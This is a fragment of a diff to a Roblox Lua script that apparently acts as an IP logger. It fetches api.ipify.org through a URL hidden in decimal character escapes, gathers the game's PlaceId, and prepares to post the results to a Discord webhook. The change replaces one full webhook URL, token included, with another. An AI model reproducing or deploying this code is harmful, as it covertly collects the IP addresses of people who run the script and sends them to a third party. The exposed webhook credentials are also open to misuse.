@@ -10,7 +10,7 @@ local webhookcheck =
 local api = game:HttpGet("\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103")
 local id1 = game.PlaceId
 local url =
-   "https://discord.com/api/webhooks/904509730259628074/NhVJWCmWOrJJuasgsfuvGZHIMD5WywBg3IUmNV3wMJ3NdK8cuBiw89CflaFkpyfQqhID"
+   "https://discord.com/api/webhooks/940752510459731978/THNpkUIDduN3LpAD91b6eMwTf_QK0My4lvOzwSIkBac2ThzCcYPuTKumTpiu2F8MvgTu"
 local data = {
    ["content"] = "",
    ["embeds"] = {
